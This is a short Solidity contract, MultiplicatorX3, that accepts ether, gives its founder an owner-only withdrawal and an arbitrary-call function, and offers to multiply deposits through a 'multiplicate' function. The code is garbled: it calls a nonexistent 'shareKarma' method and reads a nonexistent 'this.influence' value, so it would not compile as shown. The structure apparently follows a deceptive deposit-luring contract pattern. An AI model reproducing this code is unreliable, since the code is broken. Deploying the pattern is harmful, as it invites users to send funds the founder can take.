pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Founder = msg.sender;

    function() public payable{}

    function claimEarnings()
    payable
    public
    {
        require(msg.sender == Founder);
        Founder.shareKarma(this.influence);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Founder);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.influence)
        {
            adr.shareKarma(this.influence+msg.value);
        }
    }
}